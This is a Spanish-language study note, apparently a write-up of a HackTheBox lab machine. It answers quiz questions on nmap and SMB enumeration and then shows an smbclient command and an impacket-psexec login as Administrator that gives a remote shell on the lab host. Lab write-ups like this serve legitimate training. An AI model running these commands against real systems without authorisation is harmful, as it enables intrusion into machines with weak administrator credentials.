Vamos a ver [[smb]] y [[impacket-psexec]]

-------
1)¿Qué switch de Nmap podemos utilizar para enumerar máquinas cuando nuestros paquetes ICMP de ping son bloqueados por el cortafuegos de Windows?
	-Pn
	Cuando los paquetes ICMP (ping) están bloqueados por el cortafuegos de Windows, Nmap no puede determinar si el host está activo usando el método de ping tradicional. Para evitar esto y aun así intentar escanear el host se usa el parametro -Pn

2)¿Qué significa la sigla de 3 letras SMB?
	server message block

3)¿En qué puerto funciona SMB?
	445

4)¿Qué argumento de línea de comandos le das a `smbclient` para listar los recursos compartidos disponibles?
	-L

5)¿Qué carácter al final del nombre de una acción indica que se trata de una acción administrativa?
	$

6)¿Qué recurso compartido administrativo es accesible en la caja que permite a los usuarios ver todo el sistema de archivos?
	C$

7)¿Qué comando podemos utilizar para descargar los archivos que encontramos en el recurso compartido SMB?
	get

8)¿Qué herramienta de la colección Impacket puede utilizarse para obtener un shell interactivo en el sistema?
	psexec.py

---------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

![[Tactics1.png]]

![[Tactics2.png]]

![[Tactics3.png]]

![[Tactics4.png]]

Por el ttl sabemos que es una maquina windows
*Puertos relevantes*
`445` Corre con el servicio de [[smb]]

--------
# Intrusion a la maquina con [[impacket-psexec]]

```
smb client -L 10.129.139.81 -p 445 -U Administrator
```
Intentamos conectarnos con smb, pero nos termina rechazando la conexion asi que pasamos a intentar con [[impacket-psexec]]
![[Tactics5.png]]

```shell
impacket-psexec Administrator@10.129.139.81 -port 445
```


![[Tactics7.png]]

Una vez dentro ya podemos visualizar la flag

![[Tactics6.png]]


------
# Notas
En los OS windows el usuario con mas privilegios es Administrator y en linux root


-----
# Creditos
Writeup oficial HackTheBox